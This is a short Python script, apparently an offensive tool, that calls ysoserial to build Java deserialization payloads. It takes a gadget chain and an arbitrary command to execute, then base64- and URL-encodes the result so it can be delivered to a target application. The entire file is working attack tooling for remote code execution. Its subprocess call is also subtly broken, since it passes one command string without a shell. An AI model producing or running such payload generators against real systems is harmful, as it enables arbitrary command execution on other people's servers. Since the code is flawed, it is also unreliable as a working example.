import argparse
import subprocess
import base64
import urllib.parse

# Define the ysoserial command
YSOSERIAL_COMMAND = 'java -jar ysoserial.jar'

def main():
    try:
        # Set up the command line arguments
        parser = argparse.ArgumentParser(description='Generate serialized payloads for Java deserialization attacks using ysoserial.')
        parser.add_argument('-g', '--gadget', required=True, help='the gadget to use')
        parser.add_argument('-c', '--command', required=True, help='the command to execute')
        parser.add_argument('-o', '--output', default='payload.txt', help='the file to write the payload to (default: payload.txt)')
        args = parser.parse_args()

        # Generate the payload
        payload_command = '{} {} "{}"'.format(YSOSERIAL_COMMAND, args.gadget, args.command)
        payload_bytes = subprocess.check_output(payload_command)
        payload_base64 = base64.b64encode(payload_bytes).decode('utf-8')
        payload_urlencoded = urllib.parse.quote(payload_base64, safe='')

        # Write the payload to a file
        with open(args.output, 'w') as f:
            f.write(payload_urlencoded)
        print('Payload written to', args.output)
    except subprocess.CalledProcessError as e:
        print('ERROR: Failed to generate payload:', e)
    except IOError as e:
        print('ERROR: Failed to write payload to file:', e)

if __name__ == '__main__':
    main()
